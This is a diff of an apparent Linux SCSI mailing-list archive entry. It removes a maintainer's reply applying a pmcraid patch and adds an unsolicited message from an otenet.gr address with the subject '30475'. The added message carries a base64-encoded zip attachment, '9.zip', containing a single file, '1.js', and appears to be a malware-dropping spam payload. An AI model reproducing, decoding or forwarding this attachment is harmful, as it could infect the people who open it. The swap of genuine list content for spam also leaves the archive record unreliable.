@@ -1,26 +1,50 @@
-From: "Martin K. Petersen" <martin.petersen@oracle.com>
-Subject: Re: [PATCH] scsi: pmcraid: remove redundant check to see if request_size is less than zero
-Date: Mon, 08 May 2017 22:18:00 -0400
-Message-ID: <yq1wp9qrcx3.fsf@oracle.com>
-References: <20170503162901.3623-1-colin.king@canonical.com>
+From: <eaya@otenet.gr>
+Subject: 30475
+Date: Tue, 09 May 2017 02:59:57 -0000
+Message-ID: <149429879785.31457.9071514376260103725@udm.net>
 Mime-Version: 1.0
-Content-Type: text/plain
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20170503162901.3623-1-colin.king@canonical.com> (Colin King's
-        message of "Wed, 3 May 2017 17:29:01 +0100")
-Sender: linux-kernel-owner@vger.kernel.org
-To: Colin King <colin.king@canonical.com>
-Cc: "James E . J . Bottomley" <jejb@linux.vnet.ibm.com>, "Martin K . Petersen" <martin.petersen@oracle.com>, linux-scsi@vger.kernel.org, kernel-janitors@vger.kernel.org, linux-kernel@vger.kernel.org
+Content-Type: application/zip; name="9.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-scsi-owner@vger.kernel.org>
+Received: from a236.sub49.net78.udm.net ([78.85.49.236]:48975 "HELO udm.net"
+        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750966AbdEIDAC (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
+        Mon, 8 May 2017 23:00:02 -0400
+Content-Disposition: attachment
+Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
+To: linux-scsi@vger.kernel.org
 
-
-Colin,
-
-> The 2nd check to see if request_size is less than zero is redundant
-> because the first check takes error exit path on this condition. So,
-> since it is redundant, remove it.
-
-Applied to 4.12/scsi-fixes.
-
--- 
-Martin K. Petersen	Oracle Linux Engineering
+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
